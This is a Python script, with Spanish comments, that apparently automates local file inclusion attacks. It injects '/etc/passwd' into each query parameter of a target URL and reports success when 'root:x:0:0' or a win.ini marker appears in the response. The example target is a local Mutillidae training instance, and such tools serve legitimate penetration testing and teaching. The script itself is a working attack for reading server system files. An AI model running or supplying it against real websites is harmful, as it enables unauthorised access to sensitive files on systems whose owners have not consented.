#!/usr/bin/python3

from re import search
from requests import Session
from requests.exceptions import ConnectionError
from requests.adapters import HTTPAdapter
from json import loads
from urllib.parse import urlparse

class LFI:
    def __init__(self, site_url=None, blacklist = None, user_agent=None, verbose=False):
        self.site = site_url
        self.verbose = verbose
        self.blacklist = blacklist

        self.params = []
        self.user_agent = user_agent if user_agent != None else 'Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/60.0'

        self.lfi_nix = "root:x:0:0"
        self.file_nix = "/etc/passwd"
        self.lfi_win = "; for 16-bit app support"
        self.file_win = "win.ini"

        if not site_url:
            raise ValueError("Es necesario especificar la URL del sitio")
        if not self.verify_url(self.site):
            raise ValueError("No es una URL valida")

    def verify_url(self, url):
        '''
            Funcion que verifica que la URL dada al constructor sea valida.
        '''
        http_re=r"http://.*(:[0-9]{0,4})?(/.*)?/?$"
        https_re=r"https://.*(:[0-9]{0,4})?(/.*)?/?$"

        # Busca ambas expresiones regulares en la cadena
        if not search(https_re, url):
            if not search(http_re, url):
                return False

        return True


    def filter_blacklist(self):

        mimetype = urlparse(self.site).path[-5:]
         
        with open(self.blacklist, "r") as blck:
            for exclusion in blck:
                if search(exclusion[:len(exclusion)-1], mimetype):
                    return False

        return True


    def get_params(self):

        if not self.filter_blacklist():
            return False
        
        for param in urlparse(self.site).query.split('&'):
            key, value = param.split("=")
            self.params.append((key, value))

    def search_lfi(self):
        s=Session()
        headers={}
        headers['User-Agent']=self.user_agent
        s.mount(self.site, HTTPAdapter(max_retries=2))

        get_text=s.get(self.site, headers=headers).text

        if not self.search_keywords(get_text):
            self.mix_params()
        else:
            print("no sigue")
    
    def mix_params(self):
        base_url = urlparse(self.site)
        base_url = base_url.scheme + "://" + base_url.netloc + base_url.path
        print(base_url)
        print(self.params)
        for j in range(len(self.params)):
            request = base_url + "?"
            for i in range(len(self.params)):
                if i == j:
                    request +=  self.params[i][0] + "=" + self.file_nix
                else:
                    request += self.params[i][0] + "=" + self.params[i][1]
                request += "&"

            print(request[:-1])
            s=Session()
            headers={}
            headers['User-Agent']=self.user_agent
            s.mount(request, HTTPAdapter(max_retries=2))

            gget = s.get(request, headers=headers).text
            print(gget)
            if self.search_keywords(s.get(request, headers=headers).text):
                print("LFI encontrado en " + request) if self.verbose else None
                return request


    def search_keywords(self, get_text):

        if search(self.lfi_nix, get_text):
            return True
        elif search(self.lfi_win, get_text):
            return True
        else:
            return False



if __name__ == '__main__':
    a = LFI("http://localhost/mutillidae/index.php?page=add-to-your-blog.php", blacklist="/home/proy/Documents/blacklist.txt" ,verbose=True)
    a.get_params()
    a.search_lfi()

